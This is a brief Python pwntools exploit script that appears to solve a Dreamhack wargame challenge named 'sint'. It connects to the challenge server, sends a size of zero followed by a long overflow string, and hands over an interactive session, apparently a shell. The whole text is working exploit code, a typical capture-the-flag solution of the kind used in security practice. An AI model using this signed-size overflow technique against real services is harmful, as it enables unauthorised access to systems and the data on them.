from pwn import *

p = process("./sint")
p = remote("host1.dreamhack.games", 13485)

p.sendlineafter("Size: ", "0")
p.sendlineafter("Data: ", "01234566789"*30)

p.interactive()